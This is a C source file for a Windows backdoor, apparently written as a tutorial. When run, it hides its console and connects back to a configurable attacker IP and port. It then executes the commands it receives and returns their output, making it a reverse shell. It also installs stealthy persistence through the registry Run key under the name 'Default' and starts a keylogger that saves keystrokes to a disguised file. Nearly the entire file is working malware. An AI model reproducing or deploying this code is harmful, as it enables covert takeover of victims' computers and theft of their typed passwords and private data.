#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

char* servIP  = "192.168.100.93"; //change this with your attack machine IP
unsigned short serverPort  = 50005; //change this

int sock;

int bootRun()
{
        char err[128] = "Failed\n";
        char success[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
        TCHAR szPath[MAX_PATH];
        DWORD pathLength = 0;

        pathLength = GetModuleFileName(NULL, szPath, MAX_PATH);
        if (pathLength == 0) {
                send(sock, err, sizeof(err), 0);
                return -1;
        }

        HKEY NewVal;

        if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
                send(sock, err, sizeof(err), 0);
                return -1;
        }
        DWORD pathLengthInBytes = pathLength * sizeof(*szPath);
        if (RegSetValueEx(NewVal, TEXT("Default"), 0, REG_SZ, (LPBYTE)szPath, pathLengthInBytes) != ERROR_SUCCESS) {
                //we use the name "Default" to be as stealthy as possible
                RegCloseKey(NewVal);
                send(sock, err, sizeof(err), 0);
                return -1;
        }
        RegCloseKey(NewVal);
        send(sock, success, sizeof(success), 0);
        return 0;
}


DWORD WINAPI startKeyLog(){
        int vkey, last_key_state[0xFF];
        int isCAPSLOCK, isNUMLOCK;
        int isL_SHIFT, isR_SHIFT;
        int isPressed;
        char showKey;
        char NUMCHAR[]=")!@#$%^&*(";
        char chars_vn[]=";=,-./`";
        char chars_vs[]=":+<_>?~";
        char chars_va[]="[\\]\';";
        char chars_vb[]="{|}\"";
        FILE *kh;
        char KEY_LOG_FILE[]="C:\\tmp\\windows.txt"; //you can change the path or the filename
        //: making last key state 0
        for(vkey=0;vkey<0xFF;vkey++){
                last_key_state[vkey]=0;
        }

        //: running infinite
        while(1){
                //: take rest for 10 millisecond
                Sleep(10);

                //: get key state of CAPSLOCK,NUMLOCK
                //: and LEFT_SHIFT/RIGHT_SHIFT
                isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
                isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
                isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
                isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

                //: cheking state of all virtual keys
                for(vkey=0;vkey<0xFF;vkey++){
                        isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
                        showKey=(char)vkey;
                        if(isPressed==1 && last_key_state[vkey]==0){

                                //: for alphabets
                                if(vkey>=0x41 && vkey<=0x5A){
                                        if(isCAPSLOCK==0){
                                                if(isL_SHIFT==0 && isR_SHIFT==0){
                                                        showKey=(char)(vkey+0x20);
                                                }
                                        }
                                        else if(isL_SHIFT==1 || isR_SHIFT==1){
                                                showKey=(char)(vkey+0x20);
                                        }
                                }

                                //: for num chars
                                else if(vkey>=0x30 && vkey<=0x39){
                                        if(isL_SHIFT==1 || isR_SHIFT==1){
                                                showKey=NUMCHAR[vkey-0x30];
                                        }
                                }

                                //: for right side numpad
                                else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1){
                                        showKey=(char)(vkey-0x30);
                                }

                                //: for printable chars
                                else if(vkey>=0xBA && vkey<=0xC0){
                                        if(isL_SHIFT==1 || isR_SHIFT==1){
                                                showKey=chars_vs[vkey-0xBA];
                                        }
                                        else{
                                                showKey=chars_vn[vkey-0xBA];
                                        }
                                }
                                else if(vkey>=0xDB && vkey<=0xDF){
                                        if(isL_SHIFT==1 || isR_SHIFT==1){
                                                showKey=chars_vb[vkey-0xDB];
                                        }
                                        else{
                                                showKey=chars_va[vkey-0xDB];
                                        }
                                }

                                //: for right side chars ./*-+..
                                //: for chars like space,\n,enter etc..
                                //: for enter use newline char
                                //: don't print other keys
                                else if(vkey==0x0D){
                                        showKey=(char)0x0A;
                                }
                                else if(vkey>=0x6A && vkey<=0x6F){
                                        showKey=(char)(vkey-0x40);
                                }
                                else if(vkey!=0x20 && vkey!=0x09){
                                        showKey=(char)0x00;
                                }

                                //:print_and_save_captured_key
                                if(showKey!=(char)0x00){
                                        kh=fopen(KEY_LOG_FILE,"a");
                                        putc(showKey,kh);
                                        fclose(kh);
                                }
                        }
                        //: save last state of key
                        last_key_state[vkey]=isPressed;
                }


        }
}


void Shell() {
        char buffer[1024]; //this is the command we're gonna execute on the target
        char container[1024];
        char totalResponse[18384];

        while(1) {
                memset(buffer, 0, sizeof(buffer));
                memset(container, 0, sizeof(container));
                memset(totalResponse, 0,  sizeof(totalResponse));

                recv(sock, buffer, 1024, 0);

                if(strncmp("quit", buffer, 4)==0) { //this means that the user wants to quit
                        closesocket(sock);
                        WSACleanup();
                        exit(0);
                }
                else
                        if(strncmp("cd ", buffer, 3) == 0) {
                                chdir((char*)(buffer+3));
                        }
                        else if (strncmp("persist", buffer, 7) ==0) {
                                bootRun();
                        }
                        else if (strncmp("keylog", buffer, 6) ==0 ) {
                                HANDLE thread = CreateThread(NULL, 0, startKeyLog, NULL, 0, NULL);
                        }
                        else {
                                FILE* fp;
                                fp = _popen(buffer, "r"); //we execute the command inside the buffer and store in it the response
                                while(fgets(container, 1024, fp)!= NULL) { //checking if the response can fit in 1024 bytes
                                        strcat(totalResponse, container); //we concatenate in total_responsonse in 1024 increments the response
                                }
                                //send the response to the server
                                send(sock, totalResponse, sizeof(totalResponse), 0);
                                fclose(fp);
                        }

        }

}

//hInstance is used to identify the executable when it is loaded into memory
//hPrev is always 0
//lpCmdLine contains the command line arguments
//nCmdShow identifies if the window needs to be minimized, maximized or lowered

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

        //we use nCmdShow to hide our command line
        HWND stealth;
        AllocConsole(); 
        stealth = FindWindowA("ConsoleWindowClass", NULL); //the window name will be null

        ShowWindow(stealth,  0); //0 says that the window will be hidden

        struct sockaddr_in ServAddr;
        WSADATA wsaData; //is a structure that contains information about windows socket

        if(WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) { //WSAStartup returns 0 if successcessful
                exit(1);
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        //AF_INET - connection with IPV4
        //SOCK_STREAM - using TCP

        memset(&ServAddr, 0, sizeof(ServAddr)); //we put 0 in ServAddr


        ServAddr.sin_family = AF_INET;
        ServAddr.sin_addr.s_addr = inet_addr(servIP); //we put into the left the IP but we convert it first
        ServAddr.sin_port = htons(serverPort);

        while (connect(sock, (struct sockaddr*) &ServAddr, sizeof(ServAddr)) !=0){
                Sleep(10); //we're doing this so the target tries to connect to us every 10 seconds;
        }

        Shell();


}
